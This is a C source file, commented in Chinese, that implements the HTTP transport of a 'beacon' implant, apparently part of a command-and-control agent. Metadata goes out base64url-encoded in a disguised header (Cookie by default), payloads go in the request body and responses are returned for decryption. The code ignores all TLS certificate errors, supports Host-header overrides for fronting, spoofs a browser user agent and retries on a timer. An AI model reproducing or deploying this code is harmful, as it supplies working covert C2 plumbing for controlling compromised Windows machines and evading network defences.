#include "beacon_transport.h"

#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

/*
 * HTTP 传输层负责一次心跳交换：
 * metadata 放在可配置请求头中，payload 作为请求体，响应体交给 Agent 解密。
 */

/* 从配置构建完整 URL（协议 + 主机 + URI）到调用方缓冲区。成功返回 1 */
static INT BuildUrl(const Profile* profile, CHAR* out, SIZE_T out_len)
{
    const CHAR* scheme = profile->http.ssl ? "https" : "http";

    if (profile->http.target[0] == 0 || profile->http.uri[0] == 0) {
        return 0;
    }

    snprintf(out, out_len, "%s://%s%s", scheme, profile->http.target, profile->http.uri);
    return 1;
}

/* 将二进制数据编码为无填充的 base64url（RFC 4648 第 5 节）。调用方必须 HeapFree 结果 */
static CHAR* Base64UrlNopad(const BYTE8* data, SIZE_T len)
{
    static const CHAR table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";

    SIZE_T out_cap = ((len + 2) / 3) * 4 + 1;
    CHAR* out = (CHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)(out_cap) * (1));
    SIZE_T i = 0, j = 0;

    if (!out) return NULL;

    /* 每次处理 3 字节输入，输出 2-4 个 base64url 字符 */
    while (i < len) {
        SIZE_T rem = len - i;
        UINT32 b0 = data[i++];
        UINT32 b1 = rem > 1 ? data[i++] : 0;
        UINT32 b2 = rem > 2 ? data[i++] : 0;
        UINT32 n = (b0 << 16) | (b1 << 8) | b2;

        out[j++] = table[(n >> 18) & 63];
        out[j++] = table[(n >> 12) & 63];
        if (rem > 1) out[j++] = table[(n >> 6) & 63];
        if (rem > 2) out[j++] = table[n & 63];
    }

    out[j] = 0;
    return out;
}

/* 安全关闭非空的 WinHTTP 句柄 */
static VOID HttpClose(HINTERNET h)
{
    if (h) WinHttpCloseHandle(h);
}

/* 通过 WinHTTP 执行单次 HTTP 请求。成功返回 1，失败返回 0 */
static INT HttpExchangeOnce(const Profile* profile, const ByteBuf* metadata, const ByteBuf* payload, ByteBuf* response)
{
    CHAR url_a[1024];
    WCHAR* url_w = NULL;
    WCHAR* ua_w = NULL;
    WCHAR* method_w = NULL;
    HINTERNET session = NULL, connect = NULL, request = NULL;
    URL_COMPONENTS parts;
    DWORD flags = 0;
    INT ok = 0;
    WCHAR host[256];
    WCHAR path[512];
    INTERNET_PORT port = 0;

    BbInit(response);

    /* 从配置构建目标 URL */
    if (!BuildUrl(profile, url_a, sizeof(url_a))) goto cleanup;

    /* 将 UTF-8 字符串转换为 WinHTTP 所需的宽字符串 */
    url_w = Utf8ToWide(url_a);
    ua_w = Utf8ToWide(profile->http.user_agent[0] ? profile->http.user_agent : "Mozilla/5.0");
    method_w = Utf8ToWide(profile->http.method[0] ? profile->http.method : "GET");
    if (!url_w || !ua_w || !method_w) goto cleanup;

    /* 将 URL 分解为主机、路径和端口组件 */
    ZeroMemory(&parts, sizeof(parts));
    parts.dwStructSize = sizeof(parts);
    parts.lpszHostName = host;
    parts.dwHostNameLength = ARRAYSIZE(host);
    parts.lpszUrlPath = path;
    parts.dwUrlPathLength = ARRAYSIZE(path);
    if (!WinHttpCrackUrl(url_w, 0, 0, &parts)) goto cleanup;
    port = parts.nPort;

    /* 使用配置的用户代理打开 WinHTTP 会话 */
    session = WinHttpOpen(ua_w, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) goto cleanup;

    /* 从配置应用连接超时（默认 10 秒） */
    {
        DWORD timeout = (DWORD)((profile->conn_timeout_sec > 0 ? profile->conn_timeout_sec : 10) * 1000);
        WinHttpSetTimeouts(session, timeout, timeout, timeout, timeout);
    }

    connect = WinHttpConnect(session, host, port, 0);
    if (!connect) goto cleanup;

    /* 如果协议为 HTTPS 则启用 TLS 标志 */
    if (parts.nScheme == INTERNET_SCHEME_HTTPS) flags |= WINHTTP_FLAG_SECURE;

    request = WinHttpOpenRequest(connect, method_w, path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!request) goto cleanup;

    /* 忽略 HTTPS 的常见证书错误（自签名、过期等） */
    if (flags & WINHTTP_FLAG_SECURE) {
        DWORD opts = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                     SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        WinHttpSetOption(request, WINHTTP_OPTION_SECURITY_FLAGS, &opts, sizeof(opts));
    }

    /* 如果指定了自定义 Host 头则覆盖 */
    if (profile->http.host_header[0]) {
        WCHAR header[512];
        WCHAR* h = Utf8ToWide(profile->http.host_header);
        if (h) {
            swprintf_s(header, ARRAYSIZE(header), L"Host: %s", h);
            WinHttpAddRequestHeaders(request, header, (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
            HeapFree(GetProcessHeap(), 0, h);
        }
    }

    /* 如果配置中指定了 Content-Type 头则设置 */
    if (profile->http.content_type[0]) {
        WCHAR header[512];
        WCHAR* ct = Utf8ToWide(profile->http.content_type);
        if (ct) {
            swprintf_s(header, ARRAYSIZE(header), L"Content-Type: %s", ct);
            WinHttpAddRequestHeaders(request, header, (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
            HeapFree(GetProcessHeap(), 0, ct);
        }
    }

    /* 将元数据编码为 base64url 并通过自定义头发送 */
    if (metadata && metadata->len) {
        CHAR* enc = Base64UrlNopad(metadata->data, metadata->len);
        if (enc) {
            CHAR header_a[4096];
            WCHAR* header_w;

            snprintf(header_a, sizeof(header_a), "%s: %s%s",
                     profile->http.hb_header[0] ? profile->http.hb_header : "Cookie",
                     profile->http.hb_prefix, enc);

            header_w = Utf8ToWide(header_a);
            if (header_w) {
                WinHttpAddRequestHeaders(request, header_w, (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
                HeapFree(GetProcessHeap(), 0, header_w);
            }
            HeapFree(GetProcessHeap(), 0, enc);
        }
    }

    /* 发送请求及可选的载荷正文 */
    if (!WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            payload && payload->len ? payload->data : WINHTTP_NO_REQUEST_DATA,
                            payload ? (DWORD)payload->len : 0,
                            payload ? (DWORD)payload->len : 0, 0)) goto cleanup;

    if (!WinHttpReceiveResponse(request, NULL)) goto cleanup;

    /* 循环读取所有可用的响应数据 */
    for (;;) {
        DWORD avail = 0;
        DWORD read = 0;

        if (!WinHttpQueryDataAvailable(request, &avail)) goto cleanup;
        if (!avail) break;

        if (!BbReserve(response, response->len + avail)) goto cleanup;
        if (!WinHttpReadData(request, response->data + response->len, avail, &read)) goto cleanup;
        response->len += read;
    }

    ok = 1;

cleanup:
    /* 释放所有 WinHTTP 句柄和临时宽字符串分配 */
    HttpClose(request);
    HttpClose(connect);
    HttpClose(session);
    HeapFree(GetProcessHeap(), 0, url_w);
    HeapFree(GetProcessHeap(), 0, ua_w);
    HeapFree(GetProcessHeap(), 0, method_w);
    if (!ok) BbFree(response);
    return ok;
}

/* 执行 HTTP 交换，失败时自动重试。成功返回 1 */
INT TransportHttpExchange(const Profile* profile, const ByteBuf* metadata, const ByteBuf* payload, ByteBuf* response)
{
    INT attempts = profile->http.reconnect_count >= 0 ? profile->http.reconnect_count + 1 : 1;
    INT i;

    for (i = 0; i < attempts; ++i) {
        if (HttpExchangeOnce(profile, metadata, payload, response)) {
            return 1;
        }
        if (i + 1 < attempts && profile->http.reconnect_time_ms > 0) {
            Sleep((DWORD)profile->http.reconnect_time_ms);
        }
    }
    return 0;
}
